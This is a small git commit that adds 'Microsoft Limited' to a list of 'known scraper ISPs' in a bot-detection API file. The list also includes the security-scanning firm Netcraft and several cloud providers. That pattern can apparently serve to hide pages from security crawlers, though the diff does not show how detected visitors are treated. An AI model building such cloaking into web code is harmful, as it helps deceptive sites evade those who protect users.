87766a71e1f918eb454fc2f8c1119f3687eefb95
husknet <127146284+husknet@users.noreply.github.com>
2025-01-28 12:35:31 -0400

    Update detect_bot.js

--- pages/api/detect_bot.js
+++ pages/api/detect_bot.js
@@ -4,6 +4,7 @@ import geoip from 'geoip-lite';
 // Known scraper ISPs
 const SCRAPER_ISPS = [
   "Microsoft Corporation",
+  "Microsoft Limited",
   "Netcraft",
   "DigitalOcean",
   "Amazon Technologies Inc.",
